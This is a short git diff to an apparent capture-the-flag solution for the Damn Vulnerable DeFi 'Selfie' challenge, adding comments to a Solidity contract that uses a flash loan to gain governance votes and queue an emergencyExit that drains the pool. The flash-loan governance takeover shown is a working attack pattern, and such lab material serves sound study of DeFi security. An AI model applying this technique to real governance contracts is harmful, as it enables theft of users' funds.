@@ -9,6 +9,11 @@ import {SelfiePool} from "./SelfiePool.sol";
 import {Address} from "@openzeppelin/contracts/utils/Address.sol";
 import {DamnValuableVotes} from "../DamnValuableVotes.sol";
 
+/**
+ * @title AttackSelfie
+ * @author Jbayonne
+ * @notice This contract exploit the governance vulnerability of SelfiePool tanks to the flashloan function
+ */
 contract AttackSelfie is IERC3156FlashBorrower{
 
     using Address for address;
@@ -37,9 +42,13 @@ contract AttackSelfie is IERC3156FlashBorrower{
 		data;
 		fee;
 		initiator;
+		// msg.sender == TARGET -> Here target give his votes to Attack contract
 		TOKEN.delegate( address(this) );
+		// encoding action function call
 		bytes memory _data = abi.encodeWithSignature("emergencyExit(address)", RECOVERY);
+		// push the action on governance contract
 		address(GOV).functionCallWithValue( abi.encodeWithSignature("queueAction(address,uint128,bytes)", address(TARGET), 0, _data), 0 );
+		// approve for repay
 		IERC20(token).approve( address(TARGET), amount );
 		return ( keccak256("ERC3156FlashBorrower.onFlashLoan") );
 	}
